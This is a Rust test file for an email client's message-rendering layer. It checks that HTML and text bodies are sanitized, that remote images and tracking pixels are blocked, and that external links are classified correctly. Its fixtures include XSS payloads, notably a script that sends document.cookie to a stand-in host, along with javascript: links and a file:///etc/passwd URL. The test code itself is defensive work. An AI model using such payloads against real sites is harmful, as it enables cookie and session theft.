//! Tests for `render_message_body` — the seam between the store and the
//! sanitizer (U11).
//!
//! `tests/render.rs` already attacks the sanitizer itself; nothing here
//! re-tests ammonia. What is tested here is the wiring, because every mistake
//! available at this layer is silent:
//!
//!  * feeding the WebView a body that skipped the sanitizer (a text-only
//!    message is the easy one to get wrong — it is tempting to pass it through
//!    untouched);
//!  * ignoring `allowRemoteImages`, which makes the "load images" button a
//!    no-op or, worse, loads them when it was never clicked;
//!  * a snake_case key, which compiles fine and blanks the reading pane.

use mach_lib::db::models::*;
use mach_lib::db::queries as q;
use mach_lib::db::Db;
use mach_lib::ipc::render::{render_message, BodyFormat};
use mach_lib::ipc::IpcError;

use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};

// ---------------------------------------------------------------------------
// harness
// ---------------------------------------------------------------------------

static COUNTER: AtomicU64 = AtomicU64::new(0);

struct TempDb {
    path: PathBuf,
    db: Db,
}

impl TempDb {
    fn new(tag: &str) -> TempDb {
        let mut path = std::env::temp_dir();
        path.push(format!(
            "mach-render-ipc-{}-{}-{}.sqlite3",
            tag,
            std::process::id(),
            COUNTER.fetch_add(1, Ordering::SeqCst)
        ));
        let _ = std::fs::remove_file(&path);
        let db = Db::open(&path).expect("open temp db");
        TempDb { path, db }
    }
}

impl std::ops::Deref for TempDb {
    type Target = Db;
    fn deref(&self) -> &Db {
        &self.db
    }
}

impl Drop for TempDb {
    fn drop(&mut self) {
        for suffix in ["", "-wal", "-shm"] {
            let mut p = self.path.clone().into_os_string();
            p.push(suffix);
            let _ = std::fs::remove_file(PathBuf::from(p));
        }
    }
}

/// An account, a thread and one message, returning the message's row id.
fn stored_message(db: &Db, html: Option<&str>, text: Option<&str>, snippet: &str) -> i64 {
    let conn = db.writer();
    let account_id = q::upsert_account(
        &conn,
        &NewAccount {
            email: "alex@example.com".into(),
            display_name: None,
            token_ref: "com.mach.mail.oauth".into(),
            colour_index: 0,
        },
    )
    .expect("account");
    let thread_id = q::upsert_thread(
        &conn,
        &NewThread {
            account_id,
            gmail_thread_id: format!("t{}", COUNTER.fetch_add(1, Ordering::SeqCst)),
            participants: vec![Participant::new("tawny@example.com")],
            subject: "Invoice".into(),
            snippet: snippet.into(),
            last_message_at: 1_700_000_000_000,
            is_unread: true,
            message_count: 1,
            has_attachments: false,
            label_ids: vec!["INBOX".into()],
        },
    )
    .expect("thread");
    q::upsert_message(
        &conn,
        &NewMessage {
            thread_id,
            account_id,
            gmail_message_id: format!("m{}", COUNTER.fetch_add(1, Ordering::SeqCst)),
            from: Participant {
                name: Some("Tawny".into()),
                email: "tawny@example.com".into(),
            },
            to: vec![Participant::new("alex@example.com")],
            subject: "Invoice".into(),
            body_html: html.map(str::to_string),
            body_text: text.map(str::to_string),
            snippet: snippet.into(),
            internal_date: 1_700_000_000_000,
            ..Default::default()
        },
    )
    .expect("message")
}

fn json(value: &impl serde::Serialize) -> serde_json::Value {
    serde_json::to_value(value).expect("serialize")
}

fn all_keys(value: &serde_json::Value, out: &mut Vec<String>) {
    match value {
        serde_json::Value::Object(map) => {
            for (k, v) in map {
                out.push(k.clone());
                all_keys(v, out);
            }
        }
        serde_json::Value::Array(items) => items.iter().for_each(|item| all_keys(item, out)),
        _ => {}
    }
}

// ---------------------------------------------------------------------------
// the HTML path
// ---------------------------------------------------------------------------

#[test]
fn an_html_body_comes_back_sanitized() {
    let db = TempDb::new("html");
    let id = stored_message(
        &db,
        Some(
            r#"<p onclick="steal()">Hello <b>there</b></p>
               <script>fetch('https://evil.test/'+document.cookie)</script>
               <a href="javascript:alert(1)">click</a>
               <iframe src="https://evil.test/"></iframe>"#,
        ),
        None,
        "Hello there",
    );

    let rendered = render_message(&db, id, false).expect("render");

    assert_eq!(rendered.format, BodyFormat::Html);
    assert_eq!(rendered.message_id, id);
    assert!(rendered.body.html.contains("<b>there</b>"), "kept the body");
    for banned in ["<script", "onclick", "javascript:", "<iframe", "evil.test"] {
        assert!(
            !rendered.body.html.contains(banned),
            "{banned} survived into {}",
            rendered.body.html
        );
    }
}

#[test]
fn quoted_history_comes_back_separately_and_also_sanitized() {
    let db = TempDb::new("quoted");
    let id = stored_message(
        &db,
        Some(
            r#"<div>My answer.</div>
               <div class="gmail_quote"><script>alert(1)</script><p>the older message</p></div>"#,
        ),
        None,
        "My answer.",
    );

    let rendered = render_message(&db, id, false).expect("render");

    assert!(rendered.body.has_quoted, "the gmail_quote block is history");
    assert!(rendered.body.html.contains("My answer."));
    assert!(!rendered.body.html.contains("the older message"));
    assert!(rendered.body.quoted_html.contains("the older message"));
    assert!(
        !rendered.body.quoted_html.contains("<script"),
        "the quoted half is sanitized too: {}",
        rendered.body.quoted_html
    );
}

// ---------------------------------------------------------------------------
// the text path
// ---------------------------------------------------------------------------

#[test]
fn a_text_only_body_goes_through_the_sanitizers_text_path() {
    let db = TempDb::new("text");
    let id = stored_message(
        &db,
        None,
        Some("<script>alert(1)</script> ping https://example.com/x now"),
        "ping",
    );

    let rendered = render_message(&db, id, false).expect("render");

    assert_eq!(rendered.format, BodyFormat::Text);
    // Escaped, not stripped and not passed through: the text is still readable.
    assert!(
        rendered.body.html.contains("&lt;script&gt;"),
        "escaped: {}",
        rendered.body.html
    );
    assert!(!rendered.body.html.contains("<script"));
    // And autolinked by the same path, with the forced link attributes.
    assert!(rendered.body.html.contains(
        r#"<a href="https://example.com/x" target="_blank" rel="noopener noreferrer nofollow">"#
    ));
}

#[test]
fn a_message_with_no_stored_body_falls_back_to_the_snippet() {
    let db = TempDb::new("snippet");
    let id = stored_message(&db, None, None, "listed but not fetched yet");

    let rendered = render_message(&db, id, false).expect("render");

    assert_eq!(rendered.format, BodyFormat::Snippet);
    assert!(rendered.body.html.contains("listed but not fetched yet"));
}

#[test]
fn a_message_with_nothing_at_all_renders_empty_rather_than_failing() {
    let db = TempDb::new("empty");
    let id = stored_message(&db, None, None, "   ");

    let rendered = render_message(&db, id, false).expect("render");

    assert_eq!(rendered.format, BodyFormat::Empty);
    assert_eq!(rendered.body.html, "");
    assert!(!rendered.body.has_quoted);
}

// ---------------------------------------------------------------------------
// remote images
// ---------------------------------------------------------------------------

#[test]
fn remote_images_are_blocked_by_default_and_counted() {
    let db = TempDb::new("blocked");
    let id = stored_message(
        &db,
        Some(
            r#"<img src="https://tracker.test/open.gif?u=1"><img src="https://cdn.test/logo.png">"#,
        ),
        None,
        "",
    );

    let rendered = render_message(&db, id, false).expect("render");

    assert_eq!(rendered.body.blocked_remote_images, 2);
    assert!(!rendered.remote_images_allowed);
    assert!(rendered.body.html.contains("data-mach-blocked-src"));
    // No live `src` at all — the only `src` left is the placeholder pixel. The
    // leading space matters: `data-mach-blocked-src="https://…"` ends in
    // `-src="https`, and asserting without it would pass on a loadable image.
    assert!(
        !rendered.body.html.contains(r#" src="http"#),
        "nothing loadable: {}",
        rendered.body.html
    );
}

#[test]
fn allowing_remote_images_actually_changes_the_output() {
    let db = TempDb::new("allowed");
    let id = stored_message(
        &db,
        Some(r#"<img src="https://cdn.test/logo.png">"#),
        None,
        "",
    );

    let blocked = render_message(&db, id, false).expect("render blocked");
    let allowed = render_message(&db, id, true).expect("render allowed");

    assert_ne!(blocked.body.html, allowed.body.html);
    assert_eq!(allowed.body.blocked_remote_images, 0);
    assert!(allowed.remote_images_allowed);
    assert!(allowed
        .body
        .html
        .contains(r#"src="https://cdn.test/logo.png""#));
    assert!(!allowed.body.html.contains("data-mach-blocked-src"));
}

#[test]
fn opting_into_remote_images_opts_into_nothing_else() {
    let db = TempDb::new("only-images");
    let id = stored_message(
        &db,
        Some(r#"<p onmouseover="x()">hi</p><script>x()</script><a href="javascript:x()">a</a>"#),
        None,
        "",
    );

    let allowed = render_message(&db, id, true).expect("render");

    for banned in ["onmouseover", "<script", "javascript:"] {
        assert!(!allowed.body.html.contains(banned), "{banned} survived");
    }
}

// ---------------------------------------------------------------------------
// errors and the wire format
// ---------------------------------------------------------------------------

#[test]
fn an_unknown_message_id_is_a_typed_not_found() {
    let db = TempDb::new("missing");
    let error = render_message(&db, 4242, false).expect_err("should not exist");

    assert!(matches!(
        error,
        IpcError::NotFound {
            entity: "message",
            id: 4242
        }
    ));
    assert_eq!(error.kind(), "notFound");
    assert_eq!(json(&error)["kind"], "notFound");
}

#[test]
fn camel_case_on_the_wire() {
    let db = TempDb::new("camel");
    let id = stored_message(
        &db,
        Some(r#"<p>hi</p><img src="https://cdn.test/a.png"><div class="gmail_quote">old</div>"#),
        None,
        "",
    );

    let value = json(&render_message(&db, id, false).expect("render"));

    let mut keys = Vec::new();
    all_keys(&value, &mut keys);
    for key in &keys {
        assert!(
            !key.contains('_'),
            "snake_case key `{key}` on the wire: {value}"
        );
    }
    // Named explicitly, because "no underscores" would also pass if a field
    // silently disappeared.
    for expected in [
        "messageId",
        "format",
        "remoteImagesAllowed",
        "html",
        "quotedHtml",
        "hasQuoted",
        "blockedRemoteImages",
        "blockedTrackers",
        "inlineCidImages",
        "inlineDataImages",
    ] {
        assert!(keys.iter().any(|k| k == expected), "missing `{expected}`");
    }
    assert_eq!(value["format"], "html");
    assert_eq!(value["blockedRemoteImages"], 1);
    assert_eq!(value["hasQuoted"], true);
}

#[test]
fn trackers_are_blocked_and_counted_when_images_are_allowed() {
    let db = TempDb::new("trackers");
    let id = stored_message(
        &db,
        Some(
            r#"<p>hello</p>
               <img src="https://cdn.test/hero.png" width="600" height="400" alt="Hero">
               <img src="https://t.test/open?u=1" width="1" height="1">"#,
        ),
        None,
        "",
    );

    let rendered = render_message(&db, id, true).expect("render");

    assert!(rendered.remote_images_allowed);
    // The picture loads.
    assert!(
        rendered
            .body
            .html
            .contains(r#"src="https://cdn.test/hero.png""#),
        "image did not load: {}",
        rendered.body.html
    );
    // The pixel does not, and is counted as what it is.
    assert_eq!(rendered.body.blocked_trackers, 1);
    assert_eq!(rendered.body.blocked_remote_images, 0);
    assert!(
        !rendered.body.html.contains("t.test"),
        "tracker URL survived: {}",
        rendered.body.html
    );
}

// ---------------------------------------------------------------------------
// the navigation guard
// ---------------------------------------------------------------------------
//
// `link_guard` is what actually opens a link in a message, because the
// WebView's own click interception cannot: WebKit will not invoke a listener
// whose target document has scripting disabled, and the message frame's sandbox
// disables scripting by design. The hook it uses is below the engine, and its
// whole decision is `is_external_link` — so that predicate is the thing worth
// testing. Getting it wrong in one direction follows a sender's link inside
// Mach; in the other, it breaks the app's own navigation and there is no app.

use mach_lib::ipc::render::is_external_link;

fn external(url: &str) -> bool {
    is_external_link(&url::Url::parse(url).expect("parse"))
}

#[test]
fn the_app_navigates_to_itself_freely() {
    // Production, and the dev server the same window loads from.
    assert!(!external("tauri://localhost/index.html"));
    assert!(!external("http://localhost:1420/"));
    assert!(!external("http://localhost:1420/src/main.tsx"));
    assert!(!external("http://127.0.0.1:1420/"));
    // Tauri's own origins, and the message frames themselves.
    assert!(!external("http://tauri.localhost/"));
    assert!(!external("http://asset.localhost/x.png"));
    assert!(!external("http://ipc.localhost/open_external"));
    assert!(!external("asset://localhost/attachment"));
    assert!(!external("plugin://conformance/index.html"));
    assert!(!external("about:srcdoc"));
    assert!(!external("about:blank"));
    assert!(!external("data:text/html,x"));
    assert!(!external("blob:http://localhost/abc"));
}

#[test]
fn a_link_in_a_message_is_never_followed_in_here() {
    // The one that was reported twice: a Stripe click-tracking URL with a
    // second URL percent-encoded inside its path, from the "Update payment
    // method" button of a billing mail.
    assert!(external(
        "https://59.email.stripe.com/CL0/https:%2F%2Fbilling.stripe.com%2Fp%2Flogin%2F00g5kTbIE9S95448ww%3Freferer=upcoming_invoice/1/0101019fe6bf4100-2bdba2b0-dbea-4014-8a08-aca9987e05d5-000000/vtJFBTXU0xwGwuHByHespJ0_YUwby5osV8XV3vnCkA8=452"
    ));
    assert!(external("https://github.com/bborn/mach/actions/runs/1"));
    assert!(external("http://example.com/"));
    assert!(external("mailto:someone@example.com"));
    assert!(external("tel:+15551234567"));
    // A host that merely ends in the app's name is somebody else's machine.
    assert!(external("https://notlocalhost/"));
    assert!(external("https://localhost.evil.test/"));
}

#[test]
fn a_scheme_the_sanitizer_would_never_emit_is_not_opened_either() {
    // `is_external_link` is also the gate on what leaves the process, so
    // anything outside the four schemes is left for the WebView to refuse
    // rather than handed to the system.
    assert!(!external("file:///etc/passwd"));
    assert!(!external("javascript:alert(1)"));
    assert!(!external("vbscript:x"));
    assert!(!external("ftp://example.com/x"));
}
